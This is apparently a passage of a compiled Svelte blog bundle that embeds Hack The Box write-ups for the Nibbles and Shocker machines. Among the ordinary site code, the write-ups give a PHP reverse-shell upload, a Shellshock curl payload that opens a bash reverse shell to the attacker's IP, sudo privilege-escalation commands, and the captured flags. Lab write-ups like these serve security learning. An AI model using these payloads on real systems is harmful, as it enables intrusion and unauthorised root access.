\n/usr/share/laudanum/php/php-reverse-shell.php\n/usr/share/laudanum/wordpress/templates/php-reverse-shell.php\n/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php\n/usr/share/webshells/php/php-reverse-shell.php</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">cp /usr/share/laudanum/php/php-reverse-shell.php shell.php</code></pre><p>Editing the php reverse shell to connect to the attacker&#39;s IP address.</p>\n<p><img src=\"Nibbles.assets/image-20210427000705549.png\" alt=\"\"></p>\n<p>The attacker then uploads the shell.php and sets up <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p>\n<p><img src=\"Nibbles.assets/image-20210427000953310.png\" alt=\"\"></p>\n<p>The reverse shell is then stabilised using the following commands.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">which python3 # to know which python version exists\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared\nstty rows 42 cols 172 # sets the size for the tty shell</code></pre><p><img src=\"Nibbles.assets/image-20210427001449345.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f -ls 2>/dev/null</code></pre><p>The above command finds everything having the type <strong>file</strong> in the directory <strong>/home</strong>, as well as listing all the attributes of each file and finally <strong>2&gt;/dev/null</strong> is used to redirect <strong>standard error</strong> to <strong>/dev/null</strong>.</p>\n<p><img src=\"Nibbles.assets/image-20210427002323525.png\" alt=\"\"></p>\n<p><strong>User.txt</strong> can be found in the home directory of <strong>nibbler</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/nibbler/user.txt</code></pre><p><img src=\"Nibbles.assets/image-20210427002522089.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>41c963a4678306c21c790c4bb0dff71d</code></p>\n</blockquote>\n<h1 id=\"post-exploitation\">Post Exploitation</h1>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<p>As can be seen below, the user <strong>nibbler</strong> can execute the file <strong>/home/nibbler/personal/stuff/monitor.sh</strong> <em>without the need of a password</em>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">sudo -l\n...[snip]...\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">unzip personal.zip\nls -la personal/stuff/monitor.sh\n-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 personal/stuff/monitor.sh</code></pre><p><img src=\"Nibbles.assets/image-20210427004215618.png\" alt=\"\"></p>\n<h3 id=\"vulnerability-explanation-1\"><strong>Vulnerability Explanation:</strong></h3>\n<p>The file <strong>/home/nibbler/personal/stuff/monitor.sh</strong> is world-writable. The content of the file can be modified to drop a shell. When running the file as root, the attacker will be get a root shell.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># line in added at the top of the script, just after the shebang line.\n/bin/bash -p </code></pre><p><img src=\"Nibbles.assets/image-20210427004934185.png\" alt=\"\"> </p>\n<p><img src=\"Nibbles.assets/image-20210427005056993.png\" alt=\"\"></p>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Nibbles.assets/image-20210427005421970.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>d9ae263a345701460f51766ae70e5e26</code></p>\n</blockquote>\n","date":"2021-04-27","excerpt":"","printDate":"April 27, 2021","printReadingTime":"5 min read"};

var route_6 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod8
});

var Mod9 = {"title":"Second Post","slug":"second-post","html":"<p>Testing if it works locally</p>\n<h1 id=\"testing\">testing</h1>\n<p>testing</p>\n<h3 id=\"testing-1\">testing</h3>\n<p>image test </p>\n<p><img src=\"second-post.assets/image-20201204140711864.png\" alt=\"image-20201204140711864\"></p>\n","date":"2021-01-15","excerpt":"\nTesting if it works offline\n\n","printDate":"January 15, 2021","printReadingTime":"1 min read"};

var route_4 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod9
});

var Mod10 = {"title":"HTB - Shocker","slug":"Shocker","html":"<h1 id=\"shocker---10101056\">Shocker - 10.10.10.56</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.56 </code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 22:13 EDT\nNmap scan report for 10.10.10.56\nHost is up (0.24s latency).\nNot shown: 998 closed ports\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site does not have a title (text/html).\n2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.91 seconds</code></pre><p>The Ubuntu version is most likely <strong>Xenial</strong>, source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://packages.ubuntu.com/search?keywords=apache2\">https://packages.ubuntu.com/search?keywords=apache2</a></p>\n<p><img src=\"Shocker.assets/image-20210425225756592.png\" alt=\"\"></p>\n<h2 id=\"gobuster\">Gobuster</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 30 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.56 -o log/gobuster.out </code></pre><p><img src=\"Shocker.assets/image-20210425225231743.png\" alt=\"\"></p>\n<p>The directory <strong>/cgi-bin/</strong> is used when apache gives a certain tasks to a scripting language such as Bash, Python.</p>\n<p>The status 403 just means that the directory is present but the attacker does not have access to it.</p>\n<p><img src=\"Shocker.assets/image-20210425230223506.png\" alt=\"\"></p>\n<p>This indicates that a shellshock attack can be used, given the name of the machine is also shocker.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 30 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.56/cgi-bin -x sh,py,txt,pl -o log/gobuster_cgi-bin.out</code></pre><p>Even if an attacker cannot list the contents of the <strong>/cgi-bin/</strong> directory, the files can still be accessed if the name of the file is known.</p>\n<p>Gobuster is being ran with several extensions to find if there are any files present. </p>\n<p><img src=\"Shocker.assets/image-20210425230918395.png\" alt=\"\"></p>\n<p>The file <strong>user.sh</strong> is found in the <strong>/cgi-bin/</strong> directory. On going to the file, the attacker is prompted to download dialog.</p>\n<p><img src=\"Shocker.assets/image-20210425231530638.png\" alt=\"\"></p>\n<p>The content of <strong>user.sh</strong> looks to be the output of the bash command <strong>uptime</strong></p>\n<p><img src=\"Shocker.assets/image-20210425231801722.png\" alt=\"\"></p>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h2 id=\"shellshock\">Shellshock</h2>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Shellshock, also known as Bashdoor, is a family of security bugs in the  widely used Unix Bash shell, the first of which was disclosed on 24  September 2014. Many Internet-facing services, such as some web server  deployments, use Bash to process certain requests, allowing an attacker  to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.</p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/opsxcq/exploit-CVE-2014-6271\">https://github.com/opsxcq/exploit-CVE-2014-6271</a></p>\n<p>Upon testing a shellshock exploitation payload, it is concluded the web server is <strong>vulnerable to the shellshock attack</strong>. </p>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'echo I was here'\" \"http://10.10.10.56/cgi-bin/user.sh\"</code></pre><p><img src=\"Shocker.assets/image-20210425232500964.png\" alt=\"\"></p>\n<h3 id=\"getting-a-reverse-shell\">Getting a reverse shell</h3>\n<p>The tools used here to generate quick  reverse shell is called <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mthbernardes/rsg\">rsg or reverse shell generator</a></p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># generates payload and as well as listens on the specified port\nrsg 10.10.14.23 8888 bash \n# make the server connect back to the attacker using shellshock payload with bash reverse shell\ncurl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >&amp; /dev/tcp/10.10.14.23/8888 0>&amp;1'\" \"http://10.10.10.56/cgi-bin/user.sh\" </code></pre><p><img src=\"Shocker.assets/image-20210426000718594.png\" alt=\"\"></p>\n<p>A reverse shell is obtained as the user <strong>shelly</strong>. </p>\n<p><img src=\"Shocker.assets/image-20210426011418915.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<p><strong>User.txt</strong> can be found in the home directory of <strong>shelly</strong>.</p>\n<p><img src=\"Shocker.assets/image-20210426011945515.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt: 4ddc9c1abd1d367712b3dd434eaf1a9b</p>\n</blockquote>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>The user shelly can execute perl as root</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">sudo -l</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Matching Defaults entries for shelly on Shocker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser shelly may run the following commands on Shocker:\n    (root) NOPASSWD: /usr/bin/perl</code></pre><p><img src=\"Shocker.assets/image-20210426012413725.png\" alt=\"\"></p>\n<h3 id=\"vulnerability-explanation-1\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"https://gtfobins.github.io/gtfobins/\">gtfobins</a>, and searching for <strong>perl</strong>, it can be found that, perl can be used to spawn a shell.\nRunning perl as root, the attacker can break out from the restricted environment.</p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://gtfobins.github.io/gtfobins/perl/\">https://gtfobins.github.io/gtfobins/perl/</a></p>\n<p><img src=\"Shocker.assets/image-20210426012904228.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">sudo -l\nsudo /usr/bin/perl -e 'exec \"/bin/bash\";'\nwhoami</code></pre><p><img src=\"Shocker.assets/image-20210426013049169.png\" alt=\"\"></p>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<p><img src=\"Shocker.assets/image-20210426013339340.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt: 8d54789661e7e922780f49e1e2bfded1</p>\n</blockquote>\n","date":"2021-04-25","excerpt":"","printDate":"April 25, 2021","printReadingTime":"4 min read"};

var route_7 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod10
});

var Mod11 = {"title":"Testing","slug":"testing","html":"<p>This post intentionally left blank.</p>\n<p>Write what you want.</p>\n<p><img src=\"testing.assets/image-20201204142831205.png\" alt=\"image-20201204142831205\"></p>\n","date":"2021-01-14","excerpt":"\nTesting this new feature\n\n","printDate":"January 14, 2021","printReadingTime":"1 min read"};

var route_8 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod11
});

var all = [
  Mod0,
  Mod1,
  Mod2,
  Mod3,
  Mod4,
  Mod5,
  Mod6,
  Mod7,
  Mod8,
  Mod9,
  Mod10,
  Mod11
];

var posts = all
  .map((post) => ({ ...post, html: post.html.replace(/^\t{3}/gm, '') }))
  .sort((a, b) => new Date(b.date) - new Date(a.date));

const contents = JSON.stringify(posts.map(post => {
  return {
    title: post.title,
    slug: post.slug,
    excerpt: post.excerpt,
    printDate: post.printDate,
  };
}));

function get(req, res) {
  res.writeHead(200, {
    'Content-Type': 'application/json'
  });

  res.end(contents);
}

var route_0 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  get: get
});

const lookup = new Map();
posts.forEach(post => {
	lookup.set(post.slug, JSON.stringify(post));
});

function get$1(req, res, next) {
	// the `slug` parameter is available because
	// this file is called [slug].json.js
	const { slug } = req.params;

	if (lookup.has(slug)) {
		res.writeHead(200, {
			'Content-Type': 'application/json'
		});

		res.end(lookup.get(slug));
	} else {
		res.writeHead(404, {
			'Content-Type': 'application/json'
		});

		res.end(JSON.stringify({
			message: `Not found`
		}));
	}
}

var route_13 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  get: get$1
});

function noop() { }
function run(fn) {
    return fn();
}
function blank_object() {
    return Object.create(null);
}
function run_all(fns) {
    fns.forEach(run);
}
function safe_not_equal(a, b) {
    return a != a ? b == b : a !== b || ((a && typeof a === 'object') || typeof a === 'function');
}

let current_component;
function set_current_component(component) {
    current_component = component;
}
function get_current_component() {
    if (!current_component)
        throw new Error(`Function called outside component initialization`);
    return current_component;
}
function afterUpdate(fn) {
    get_current_component().$$.after_render.push(fn);
}
function setContext(key, context) {
    get_current_component().$$.context.set(key, context);
}
const escaped = {
    '"': '&quot;',
    "'": '&#39;',
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;'
};
function escape(html) {
    return String(html).replace(/["'&<>]/g, match => escaped[match]);
}
function each(items, fn) {
    let str = '';
    for (let i = 0; i < items.length; i += 1) {
        str += fn(items[i], i);
    }
    return str;
}
const missing_component = {
    $$render: () => ''
};
function validate_component(component, name) {
    if (!component || !component.$$render) {
        if (name === 'svelte:component')
            name += ' this={...}';
        throw new Error(`<${name}> is not a valid SSR component. You may need to review your build config to ensure that dependencies are compiled, rather than imported as pre-compiled modules`);
    }
    return component;
}
let on_destroy;
function create_ssr_component(fn) {
    function $$render(result, props, bindings, slots) {
        const parent_component = current_component;
        const $$ = {
            on_destroy,
            context: new Map(parent_component ? parent_component.$$.context : []),
            // these will be immediately discarded
            on_mount: [],
            before_render: [],
            after_render: [],
            callbacks: blank_object()
        };
        set_current_component({ $$ });
        const html = fn(result, props, bindings, slots);
        set_current_component(parent_component);
        return html;
    }
    return {
        render: (props = {}, options = {}) => {
            on_destroy = [];
            const result = { head: '', css: new Set() };
            const html = $$render(result, props, {}, options);
            run_all(on_destroy);
            return {
                html,
                css: {
                    code: Array.from(result.css).map(css => css.code).join('\n'),
                    map: null // TODO
                },
                head: result.head
            };
        },
        $$render
    };
}

/* src/routes/index.svelte generated by Svelte v3.5.0 */

const css = {
	code: ".home-container.svelte-udj75a{align-items:center;display:flex;flex:1;justify-content:center;margin:2em 0;min-height:400px}.home-copy.svelte-udj75a{flex:1}h1.svelte-udj75a{font-weight:700;margin-bottom:0.5em}p.svelte-udj75a{font-size:1.4em;line-height:1.5}figure.svelte-udj75a{margin:0 1em;text-align:center;flex:0.35}img.svelte-udj75a{width:100%;max-width:400px}@media(max-width: 1020px){p.svelte-udj75a{font-size:1.2em}img.svelte-udj75a{max-width:300px}}@media(max-width: 800px){.home-container.svelte-udj75a{flex-direction:column}.home-copy.svelte-udj75a{flex:0;padding-bottom:2em;text-align:center}}",
	map: "{\"version\":3,\"file\":\"index.svelte\",\"sources\":[\"index.svelte\"],\"sourcesContent\":[\"<style>\\n  .home-container {\\n    align-items: center;\\n    display: flex;\\n    flex: 1;\\n    justify-content: center;\\n    margin: 2em 0;\\n    min-height: 400px;\\n  }\\n\\n  .home-copy {\\n    flex: 1;\\n  }\\n\\n  h1 {\\n    font-weight: 700;\\n    margin-bottom: 0.5em;\\n  }\\n\\n  p {\\n    font-size: 1.4em;\\n    line-height: 1.5;\\n  }\\n\\n  figure {\\n    margin: 0 1em;\\n    text-align: center;\\n    flex: 0.35;\\n  }\\n\\n  /* figcaption {\\n    font-size: .8em;\\n    font-style: italic;\\n  } */\\n\\n  img {\\n    width: 100%;\\n    max-width: 400px;\\n  }\\n\\n  @media (max-width: 1020px) {\\n    p {\\n      font-size: 1.2em;\\n    }\\n\\n    img {\\n      max-width: 300px;\\n    }\\n  }\\n\\n  @media (max-width: 800px) {\\n    .home-container {\\n      flex-direction: column;\\n    }\\n\\n    .home-copy {\\n      flex: 0;\\n      padding-bottom: 2em;\\n      text-align: center;\\n    }\\n  }\\n</style>\\n\\n<svelte:head>\\n  <title>Anubhav | Blog</title>\\n</svelte:head>\\n\\n<div class=\\\"home-container\\\">\\n  <div class=\\\"home-copy\\\">\\n    <h1>Welcome to my Blog</h1>\\n    <p>This blog is mostly used to post my markdown notes for future references.</p>\\n    <p>Check out my <a href=\\\"https://anubhav.xyz/\\\" target=\\\"_blank\\\">Website</a>.</p>\\n  </div>\\n\\n  <figure>\\n    <img alt='Logo' src='as-logo2.ico'>\\n    <!-- <figcaption>Illustration thanks to <a href=\\\"https://undraw.co\\\" target=\\\"_blank\\\">Undraw</a></figcaption> -->\\n  </figure>\\n</div>\"],\"names\":[],\"mappings\":\"AACE,eAAe,cAAC,CAAC,AACf,WAAW,CAAE,MAAM,CACnB,OAAO,CAAE,IAAI,CACb,IAAI,CAAE,CAAC,CACP,eAAe,CAAE,MAAM,CACvB,MAAM,CAAE,GAAG,CAAC,CAAC,CACb,UAAU,CAAE,KAAK,AACnB,CAAC,AAED,UAAU,cAAC,CAAC,AACV,IAAI,CAAE,CAAC,AACT,CAAC,AAED,EAAE,cAAC,CAAC,AACF,WAAW,CAAE,GAAG,CAChB,aAAa,CAAE,KAAK,AACtB,CAAC,AAED,CAAC,cAAC,CAAC,AACD,SAAS,CAAE,KAAK,CAChB,WAAW,CAAE,GAAG,AAClB,CAAC,AAED,MAAM,cAAC,CAAC,AACN,MAAM,CAAE,CAAC,CAAC,GAAG,CACb,UAAU,CAAE,MAAM,CAClB,IAAI,CAAE,IAAI,AACZ,CAAC,AAOD,GAAG,cAAC,CAAC,AACH,KAAK,CAAE,IAAI,CACX,SAAS,CAAE,KAAK,AAClB,CAAC,AAED,MAAM,AAAC,YAAY,MAAM,CAAC,AAAC,CAAC,AAC1B,CAAC,cAAC,CAAC,AACD,SAAS,CAAE,KAAK,AAClB,CAAC,AAED,GAAG,cAAC,CAAC,AACH,SAAS,CAAE,KAAK,AAClB,CAAC,AACH,CAAC,AAED,MAAM,AAAC,YAAY,KAAK,CAAC,AAAC,CAAC,AACzB,eAAe,cAAC,CAAC,AACf,cAAc,CAAE,MAAM,AACxB,CAAC,AAED,UAAU,cAAC,CAAC,AACV,IAAI,CAAE,CAAC,CACP,cAAc,CAAE,GAAG,CACnB,UAAU,CAAE,MAAM,AACpB,CAAC,AACH,CAAC\"}"
};

const Index = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	$$result.css.add(css);

	return `${($$result.head += `<title>Anubhav | Blog</title>`, "")}

	<div class="home-container svelte-udj75a">
	  <div class="home-copy svelte-udj75a">
	    <h1 class="svelte-udj75a">Welcome to my Blog</h1>
	    <p class="svelte-udj75a">This blog is mostly used to post my markdown notes for future references.</p>
	    <p class="svelte-udj75a">Check out my <a href="https://anubhav.xyz/" target="_blank">Website</a>.</p>
	  </div>

	  <figure class="svelte-udj75a">
	    <img alt="Logo" src="as-logo2.ico" class="svelte-udj75a">
	    
	  </figure>
	</div>`;
});

/* src/routes/about.svelte generated by Svelte v3.5.0 */

const css$1 = {
	code: "figure.svelte-1t712sc{float:right;margin:-3em -7em 2em 2em;max-width:400px}figure.svelte-1t712sc img.svelte-1t712sc{border-radius:8px}@media(max-width: 1020px){figure.svelte-1t712sc{float:none;margin:0 auto 2em}}",
	map: "{\"version\":3,\"file\":\"about.svelte\",\"sources\":[\"about.svelte\"],\"sourcesContent\":[\"<style>\\n  figure {\\n    float: right;\\n    margin: -3em -7em 2em 2em;\\n    max-width: 400px;\\n  }\\n\\n  figure img {\\n    border-radius: 8px;\\n  }\\n\\n  @media (max-width: 1020px) {\\n    figure {\\n      float: none;\\n      margin: 0 auto 2em;\\n    }\\n  }\\n</style>\\n\\n<svelte:head>\\n  <title>About</title>\\n</svelte:head>\\n\\n<div class=\\\"container\\\">\\n  <h1>About</h1>\\n  <figure>\\n    <img src='rsz_florian-klauer-489-unsplash.jpg' alt='Image of a vintage typewriter.'>\\n    <figcaption>Photo by <a href=\\\"https://unsplash.com/@florianklauer\\\" target=\\\"_blank\\\">Florian Klauer</a> on Unsplash</figcaption>\\n  </figure>\\n  <p>Text placeholder via <a href=\\\"https://jeffsum.com/\\\" target=\\\"_blank\\\">Jeffsum</a>.</p>\\n  <p>So you two dig up, dig up dinosaurs? What do they got in there? King Kong? My dad once told me, laugh and the world laughs with you, Cry, and I'll give you something to cry about you little bastard! Life finds a way. God creates dinosaurs. God destroys dinosaurs. God creates Man. Man destroys God. Man creates Dinosaurs.</p>\\n  <p>You really think you can fly that thing? You know what? It is beets. I've crashed into a beet truck. Forget the fat lady! You're obsessed with the fat lady! Drive us out of here! Is this my espresso machine? Wh-what is-h-how did you get my espresso machine?</p>\\n  <p>Hey, you know how I'm, like, always trying to save the planet? Here's my chance. Hey, take a look at the earthlings. Goodbye! I was part of something special. Just my luck, no ice. You're a very talented young man, with your own clever thoughts and ideas. Do you need a manager?</p>\\n  <p>Jaguar shark! So tell me - does it really exist? This thing comes fully loaded. AM/FM radio, reclining bucket seats, and... power windows. Yes, Yes, without the oops! You're a very talented young man, with your own clever thoughts and ideas. Do you need a manager?</p>\\n  <p>Yes, Yes, without the oops! Do you have any idea how long it takes those cups to decompose. They're using our own satellites against us. And the clock is ticking. Do you have any idea how long it takes those cups to decompose. My dad once told me, laugh and the world laughs with you, Cry, and I'll give you something to cry about you little bastard!</p>\\n</div>\\n\"],\"names\":[],\"mappings\":\"AACE,MAAM,eAAC,CAAC,AACN,KAAK,CAAE,KAAK,CACZ,MAAM,CAAE,IAAI,CAAC,IAAI,CAAC,GAAG,CAAC,GAAG,CACzB,SAAS,CAAE,KAAK,AAClB,CAAC,AAED,qBAAM,CAAC,GAAG,eAAC,CAAC,AACV,aAAa,CAAE,GAAG,AACpB,CAAC,AAED,MAAM,AAAC,YAAY,MAAM,CAAC,AAAC,CAAC,AAC1B,MAAM,eAAC,CAAC,AACN,KAAK,CAAE,IAAI,CACX,MAAM,CAAE,CAAC,CAAC,IAAI,CAAC,GAAG,AACpB,CAAC,AACH,CAAC\"}"
};

const About = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	$$result.css.add(css$1);

	return `${($$result.head += `<title>About</title>`, "")}

	<div class="container">
	  <h1>About</h1>
	  <figure class="svelte-1t712sc">
	    <img src="rsz_florian-klauer-489-unsplash.jpg" alt="Image of a vintage typewriter." class="svelte-1t712sc">
	    <figcaption>Photo by <a href="https://unsplash.com/@florianklauer" target="_blank">Florian Klauer</a> on Unsplash</figcaption>
	  </figure>
	  <p>Text placeholder via <a href="https://jeffsum.com/" target="_blank">Jeffsum</a>.</p>
	  <p>So you two dig up, dig up dinosaurs? What do they got in there? King Kong? My dad once told me, laugh and the world laughs with you, Cry, and I'll give you something to cry about you little bastard! Life finds a way. God creates dinosaurs. God destroys dinosaurs. God creates Man. Man destroys God. Man creates Dinosaurs.</p>
	  <p>You really think you can fly that thing? You know what? It is beets. I've crashed into a beet truck. Forget the fat lady! You're obsessed with the fat lady! Drive us out of here! Is this my espresso machine? Wh-what is-h-how did you get my espresso machine?</p>
	  <p>Hey, you know how I'm, like, always trying to save the planet? Here's my chance. Hey, take a look at the earthlings. Goodbye! I was part of something special. Just my luck, no ice. You're a very talented young man, with your own clever thoughts and ideas. Do you need a manager?</p>
	  <p>Jaguar shark! So tell me - does it really exist? This thing comes fully loaded. AM/FM radio, reclining bucket seats, and... power windows. Yes, Yes, without the oops! You're a very talented young man, with your own clever thoughts and ideas. Do you need a manager?</p>
	  <p>Yes, Yes, without the oops! Do you have any idea how long it takes those cups to decompose. They're using our own satellites against us. And the clock is ticking. Do you have any idea how long it takes those cups to decompose. My dad once told me, laugh and the world laughs with you, Cry, and I'll give you something to cry about you little bastard!</p>
	</div>`;
});

/* node_modules/svelte-fa/src/fa.svelte generated by Svelte v3.5.0 */

const Fa = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { class: clazz = '', id = '', style = '', icon, fw = false, flip = false, pull = false, rotate = false, size = false, color = '', primaryColor = '', secondaryColor = '', primaryOpacity = 1, secondaryOpacity = 0.4, swapOpacity = false } = $$props;

let i;
let s;
let transform;

	if ($$props.class === void 0 && $$bindings.class && clazz !== void 0) $$bindings.class(clazz);
	if ($$props.id === void 0 && $$bindings.id && id !== void 0) $$bindings.id(id);
	if ($$props.style === void 0 && $$bindings.style && style !== void 0) $$bindings.style(style);
	if ($$props.icon === void 0 && $$bindings.icon && icon !== void 0) $$bindings.icon(icon);
	if ($$props.fw === void 0 && $$bindings.fw && fw !== void 0) $$bindings.fw(fw);
	if ($$props.flip === void 0 && $$bindings.flip && flip !== void 0) $$bindings.flip(flip);
	if ($$props.pull === void 0 && $$bindings.pull && pull !== void 0) $$bindings.pull(pull);
	if ($$props.rotate === void 0 && $$bindings.rotate && rotate !== void 0) $$bindings.rotate(rotate);
	if ($$props.size === void 0 && $$bindings.size && size !== void 0) $$bindings.size(size);
	if ($$props.color === void 0 && $$bindings.color && color !== void 0) $$bindings.color(color);
	if ($$props.primaryColor === void 0 && $$bindings.primaryColor && primaryColor !== void 0) $$bindings.primaryColor(primaryColor);
	if ($$props.secondaryColor === void 0 && $$bindings.secondaryColor && secondaryColor !== void 0) $$bindings.secondaryColor(secondaryColor);
	if ($$props.primaryOpacity === void 0 && $$bindings.primaryOpacity && primaryOpacity !== void 0) $$bindings.primaryOpacity(primaryOpacity);
	if ($$props.secondaryOpacity === void 0 && $$bindings.secondaryOpacity && secondaryOpacity !== void 0) $$bindings.secondaryOpacity(secondaryOpacity);
	if ($$props.swapOpacity === void 0 && $$bindings.swapOpacity && swapOpacity !== void 0) $$bindings.swapOpacity(swapOpacity);

	i = (icon && icon.icon) || [0, 0, '', [], ''];
	{
      let float;
      let width;
      const height = '1em';
      let lineHeight;
      let fontSize;
      let textAlign;
      let verticalAlign = '-.125em';
      const overflow = 'visible';
    
      if (fw) {
        textAlign = 'center';
        width = '1.25em';
      }
    
      if (pull) {
        float = pull;
      }
    
      if (size) {
        if (size == 'lg') {
          fontSize = '1.33333em';
          lineHeight = '.75em';
          verticalAlign = '-.225em';
        } else if (size == 'xs') {
          fontSize = '.75em';
        } else if (size == 'sm') {
          fontSize = '.875em';
        } else {
          fontSize = size.replace('x', 'em');
        }
      }
    
      const styleObj = {
        float,
        width,
        height,
        'line-height': lineHeight,
        'font-size': fontSize,
        'text-align': textAlign,
        'vertical-align': verticalAlign,
        overflow,
      };
      let styleStr = '';
      for (const prop in styleObj) {
        if (styleObj[prop]) {
          styleStr += `${prop}:${styleObj[prop]};`;
        }
      }
      s = styleStr + style;
    }
	{
      let t = '';
    
      if (flip) {
        let flipX = 1;
        let flipY = 1;
        if (flip == 'horizontal') {
          flipX = -1;
        } else if (flip == 'vertical') {
          flipY = -1;
        } else {
          flipX = flipY = -1;
        }
        t += ` scale(${flipX} ${flipY})`;
      }
    
      if (rotate) {
        t += ` rotate(${rotate} 0 0)`;
      }
    
      transform = t;
    }

	return `${ i[4] ? `<svg${(v => v == null ? "" : ` id="${escape(id)}"`)(id)}${(v => v == null ? "" : ` class="${escape(clazz)}"`)(clazz)}${(v => v == null ? "" : ` style="${escape(s)}"`)(s)}${(v => v == null ? "" : ` viewBox="${escape(`0 0 ${i[0]} ${i[1]}`)}"`)(`0 0 ${i[0]} ${i[1]}`)} aria-hidden="true" role="img" xmlns="http://www.w3.org/2000/svg">
	    <g transform="translate(256 256)">
	      <g${(v => v == null ? "" : ` transform="${escape(transform)}"`)(transform)}>
	        ${ typeof i[4] == 'string' ? `<path${(v => v == null ? "" : ` d="${escape(i[4])}"`)(i[4])}${(v => v == null ? "" : ` fill="${escape(color || primaryColor || 'currentColor')}"`)(color || primaryColor || 'currentColor')} transform="translate(-256 -256)"></path>` : `<path${(v => v == null ? "" : ` d="${escape(i[4][0])}"`)(i[4][0])}${(v => v == null ? "" : ` fill="${escape(secondaryColor || color || 'currentColor')}"`)(secondaryColor || color || 'currentColor')}${(v => v == null ? "" : ` fill-opacity="${escape(swapOpacity != false ? primaryOpacity : secondaryOpacity)}"`)(swapOpacity != false ? primaryOpacity : secondaryOpacity)} transform="translate(-256 -256)"></path>
	          <path${(v => v == null ? "" : ` d="${escape(i[4][1])}"`)(i[4][1])}${(v => v == null ? "" : ` fill="${escape(primaryColor || color || 'currentColor')}"`)(primaryColor || color || 'currentColor')}${(v => v == null ? "" : ` fill-opacity="${escape(swapOpacity != false ? secondaryOpacity : primaryOpacity)}"`)(swapOpacity != false ? secondaryOpacity : primaryOpacity)} transform="translate(-256 -256)"></path>` }
	      </g>
	    </g>
	  </svg>` : `` }`;
});

/* src/routes/blog/BackToTop.svelte generated by Svelte v3.5.0 */

const css$2 = {
